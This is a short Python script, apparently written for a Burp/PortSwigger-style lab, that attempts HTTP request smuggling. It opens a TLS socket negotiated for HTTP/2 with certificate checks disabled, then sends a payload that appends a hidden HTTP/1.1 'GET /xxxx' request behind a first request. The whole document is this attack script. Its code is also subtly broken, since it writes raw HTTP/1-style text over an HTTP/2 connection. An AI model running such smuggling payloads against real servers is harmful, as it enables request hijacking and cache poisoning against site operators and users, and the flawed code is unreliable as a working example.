import socket
import ssl
import sys
import requests

def connect_h2_socket(host):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    context = ssl.create_default_context()
    context.set_alpn_protocols(["h2"])
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    sock.connect((host, 443))
    sock = context.wrap_socket(sock, server_hostname=host)
    return sock

print("Wait 30-120 sec")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1]
    host = burp_url[8:]  

    s = connect_h2_socket(host)
#    print("Selected protocol:", s.selected_alpn_protocol())

    payload = (
        b"GET / HTTP/2\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"foo: bar\r\n\r\n"
        b"GET /xxxx HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n\r\n"
    )
    s.sendall(payload)

    response = s.recv(4096).decode()
    print("Response received:\n", response)

    s.close()
